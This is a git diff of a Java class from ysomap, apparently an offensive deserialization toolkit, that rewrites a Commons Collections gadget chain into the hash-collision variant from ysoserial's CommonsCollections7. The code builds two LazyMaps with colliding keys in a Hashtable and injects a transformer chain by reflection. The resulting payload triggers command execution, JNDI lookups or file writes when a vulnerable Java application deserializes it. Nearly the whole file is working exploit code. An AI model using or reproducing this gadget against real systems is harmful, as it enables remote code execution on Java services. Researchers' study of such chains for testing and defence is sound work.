@@ -1,35 +1,36 @@
-package ysomap.payloads.java.collections;
+package ysomap.payloads.java.commons.collection_v3;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import ysomap.bullets.Bullet;
-import ysomap.common.annotation.*;
 import ysomap.bullets.collections.TransformerBullet;
+import ysomap.common.annotation.*;
 import ysomap.core.util.ReflectionHelper;
 import ysomap.payloads.AbstractPayload;
 
-import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
 /**
+ * 仅供学习，实战不建议
+ * from ysoserial CommonsCollections7
  * @author wh1t3P1g
  * @since 2020/2/18
  */
 @SuppressWarnings({"rawtypes","unchecked"})
-@Payloads
+//@Payloads
+@Deprecated
 @Targets({Targets.JDK})
-@Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Require(bullets = {"TransformerBullet",
         "TransformerWithJNDIBullet",
         "TransformerWithSleepBullet",
         "TransformerWithURLClassLoaderBullet",
         "TransformerWithFileWriteBullet"}, param = false)
-@Authors({ Authors.WH1T3P1G })
-public class CommonsCollections8 extends AbstractPayload<Hashtable> {
+@Dependencies({"commons-collections:commons-collections:3.2.1"})
+@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
+public class CommonsCollections6 extends AbstractPayload<Hashtable> {
 
     @Override
     public boolean checkObject(Object obj) {
@@ -38,6 +39,7 @@ public class CommonsCollections8 extends AbstractPayload<Hashtable> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
+        //ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null, "3");
         return TransformerBullet.newInstance(args);
     }
 
@@ -45,29 +47,28 @@ public class CommonsCollections8 extends AbstractPayload<Hashtable> {
     public Hashtable pack(Object obj) throws Exception {
         Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
-        final Map innerMap = new HashMap();
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
 
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put("yy", 1);
 
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put("zZ", 1);
+
+        // Use the colliding Maps as keys in Hashtable
         Hashtable hashtable = new Hashtable();
-        hashtable.put("foo",1);
-        // 获取hashtable的table类属性
-        Field tableField = Hashtable.class.getDeclaredField("table");
-        ReflectionHelper.setAccessible(tableField);
-        Object[] table = (Object[])tableField.get(hashtable);
-        Object entry1 = table[0];
-        if(entry1==null)
-            entry1 = table[1];
-        // 获取Hashtable.Entry的key属性
-        Field keyField = entry1.getClass().getDeclaredField("key");
-        ReflectionHelper.setAccessible(keyField);
-        // 将key属性给替换成构造好的TiedMapEntry实例
-        keyField.set(entry1, entry);
-        // 填充真正的命令执行代码
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
         ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj);
+
+        // Needed to ensure hash collision after previous manipulations
+        lazyMap2.remove("yy");
 
         return hashtable;
     }
+
 
 }
